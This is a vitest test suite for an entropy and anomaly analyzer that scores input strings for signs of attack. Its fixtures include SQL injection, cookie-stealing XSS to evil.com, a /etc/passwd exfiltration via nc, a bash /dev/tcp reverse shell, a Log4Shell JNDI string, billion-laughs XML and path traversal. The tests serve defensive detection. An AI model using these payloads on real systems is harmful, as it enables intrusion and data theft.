import { describe, it, expect } from 'vitest'
import {
    shannonEntropy,
    charClassDistribution,
    repetitionIndex,
    structuralDensity,
    computeAnomalyProfile,
    anomalyConfidenceMultiplier,
    isLikelyEncoded,
} from './entropy-analyzer.js'

describe('Shannon Entropy', () => {
    it('returns 0 for empty input', () => {
        expect(shannonEntropy('')).toBe(0)
    })

    it('returns 0 for single repeated character', () => {
        expect(shannonEntropy('aaaaaaaaaa')).toBe(0)
    })

    it('returns 1 for two equally distributed characters', () => {
        expect(shannonEntropy('ababababab')).toBeCloseTo(1.0, 1)
    })

    it('returns higher entropy for more character variety', () => {
        const low = shannonEntropy('aabbccdd')
        const high = shannonEntropy('abcdefghijklmnop')
        expect(high).toBeGreaterThan(low)
    })

    it('normal English text is 3.5-4.5 bits/char', () => {
        const text = 'The quick brown fox jumps over the lazy dog'
        const e = shannonEntropy(text)
        expect(e).toBeGreaterThan(3.5)
        expect(e).toBeLessThan(4.6)
    })

    it('SQL injection has characteristic entropy', () => {
        const sqli = "' OR 1=1-- ' OR 1=1-- ' OR 1=1--"
        const e = shannonEntropy(sqli)
        // Repetitive SQL injection templates have lower entropy
        expect(e).toBeLessThan(4.0)
    })
})


describe('Character Class Distribution', () => {
    it('handles empty input', () => {
        const d = charClassDistribution('')
        expect(d.alpha).toBe(0)
    })

    it('pure alpha is 100% alpha', () => {
        const d = charClassDistribution('helloworld')
        expect(d.alpha).toBeCloseTo(1.0, 2)
    })

    it('detects metacharacter-heavy input', () => {
        const d = charClassDistribution("<script>alert('xss')</script>")
        expect(d.metachar).toBeGreaterThan(0.15)
    })

    it('normal text has low metacharacter ratio', () => {
        const d = charClassDistribution('This is a normal search query about JavaScript frameworks')
        expect(d.metachar).toBeLessThan(0.05)
        expect(d.alpha).toBeGreaterThan(0.70)
    })

    it('SQL injection has elevated special characters', () => {
        const d = charClassDistribution("' UNION SELECT * FROM users WHERE id=1--")
        expect(d.metachar).toBeGreaterThan(0.05)
    })
})


describe('Repetition Index', () => {
    it('returns 0 for very short input', () => {
        expect(repetitionIndex('ab')).toBe(0)
    })

    it('returns high for completely repetitive input', () => {
        const rep = repetitionIndex('abcabcabcabcabcabcabcabc')
        expect(rep).toBeGreaterThan(0.6)
    })

    it('returns low for unique text', () => {
        const rep = repetitionIndex('The quick brown fox jumps over the lazy dog with great speed')
        expect(rep).toBeLessThan(0.5)
    })

    it('catches billion laughs pattern', () => {
        const laughs = '&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;'
        const rep = repetitionIndex(laughs)
        expect(rep).toBeGreaterThan(0.7)
    })
})


describe('Structural Density', () => {
    it('returns 0 for pure alpha', () => {
        expect(structuralDensity('helloworld')).toBe(0)
    })

    it('returns high for XSS payload', () => {
        const density = structuralDensity('<img src=x onerror="alert(1)">')
        expect(density).toBeGreaterThan(0.15)
    })

    it('returns high for shell injection', () => {
        const density = structuralDensity('; cat /etc/passwd | nc 10.0.0.1 4444 &')
        expect(density).toBeGreaterThan(0.10)
    })

    it('returns low for normal text', () => {
        const density = structuralDensity('My name is John and I live in New York')
        expect(density).toBeLessThan(0.05)
    })
})


describe('Anomaly Profile', () => {
    it('normal text has low anomaly score', () => {
        const profile = computeAnomalyProfile(
            'I would like to search for hotels in San Francisco for next weekend'
        )
        expect(profile.anomalyScore).toBeLessThan(0.20)
        expect(profile.signals.length).toBeLessThanOrEqual(1)
    })

    it('SQL injection with heavy metacharacters has elevated anomaly', () => {
        // Multi-technique SQL injection with lots of metacharacters
        const profile = computeAnomalyProfile(
            "' AND 1=1 UNION SELECT * FROM (SELECT CONCAT(username,0x3a,password)) WHERE '1'='1'--"
        )
        // This contains: ' = ( ) * ( ( ) ) ' ' -- = at least 12 metachar in ~85 chars ≈ 14%
        expect(profile.anomalyScore).toBeGreaterThan(0.05)
    })

    it('XSS payload has high anomaly', () => {
        const profile = computeAnomalyProfile(
            '<script>document.location="http://evil.com/?c="+document.cookie</script>'
        )
        expect(profile.anomalyScore).toBeGreaterThan(0.15)
        expect(profile.signals).toContain('high_metachar')
    })

    it('reverse shell has very high anomaly', () => {
        const profile = computeAnomalyProfile(
            '; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
        )
        expect(profile.anomalyScore).toBeGreaterThan(0.20)
    })

    it('billion laughs has high repetition', () => {
        const profile = computeAnomalyProfile(
            '<!ENTITY lol "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
        )
        expect(profile.signals.some(s => s.includes('repetition') || s.includes('metachar'))).toBe(true)
    })

    it('base64-encoded payload has high entropy', () => {
        const profile = computeAnomalyProfile(
            'rO0ABXNyABdjb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwqOZgPiNWJRMDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyAD'
        )
        expect(profile.entropy).toBeGreaterThan(4.5)
    })
})


describe('Anomaly Confidence Multiplier', () => {
    it('returns 1.0 for normal text', () => {
        const mult = anomalyConfidenceMultiplier('Hello, my name is John')
        expect(mult).toBeCloseTo(1.0, 1)
    })

    it('returns > 1.0 for highly anomalous input', () => {
        const mult = anomalyConfidenceMultiplier(
            '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/x}'
        )
        expect(mult).toBeGreaterThanOrEqual(1.0)
    })

    it('returns 1.0 for short inputs (no meaningful signal)', () => {
        expect(anomalyConfidenceMultiplier('abc')).toBe(1.0)
    })
})


describe('isLikelyEncoded', () => {
    it('detects base64-like content', () => {
        expect(isLikelyEncoded(
            'rO0ABXNyABdjb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFw'
        )).toBe(true)
    })

    it('detects hex-encoded content', () => {
        expect(isLikelyEncoded(
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        )).toBe(true)
    })

    it('does not flag normal text', () => {
        expect(isLikelyEncoded('This is a normal search query')).toBe(false)
    })

    it('does not flag short inputs', () => {
        expect(isLikelyEncoded('short')).toBe(false)
    })
})
